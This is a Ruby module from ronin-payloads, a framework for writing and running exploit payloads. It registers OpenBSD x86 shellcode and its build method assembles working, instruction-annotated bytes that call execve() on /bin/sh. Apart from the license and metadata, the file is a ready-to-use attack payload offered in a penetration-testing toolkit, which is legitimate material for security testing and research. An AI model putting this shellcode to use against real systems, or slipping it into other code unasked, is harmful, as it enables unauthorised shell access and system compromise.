# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/exec_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module OpenBSD
        module X86
          #
          # OpenBSD x86 shellcode that calls `execve()` with `/bin/sh`.
          #
          class ExecShell < ExecShellPayload

            register 'shellcode/openbsd/x86/exec_shell'

            arch :x86
            os :openbsd

            author 'hophet', email:   'hophet@gmail.com',
                             website: 'http://www.nlabs.com.br/~hophet/'

            summary 'OpenBSD x86 execve() shellcode'
            description <<~DESC
            OpenBSD x86 shellcode that calls execve() with "/bin/sh".
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-163.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x99".b +                 # cltd
                         "\x52".b +                 # push	%edx
                         "\x68\x6e\x2f\x73\x68".b + # push	$0x68732f6e
                         "\x68\x2f\x2f\x62\x69".b + # push	$0x69622f2f
                         "\x89\xe3".b +             # mov	%esp,%ebx
                         "\x52".b +                 # push	%edx
                         "\x54".b +                 # push	%esp
                         "\x53".b +                 # push	%ebx
                         "\x53".b +                 # push	%ebx
                         "\x6a\x3b".b +             # push	$0x3b
                         "\x58".b +                 # pop	%eax
                         "\xcd\x80".b               # int	$0x80
            end

          end
        end
      end
    end
  end
end
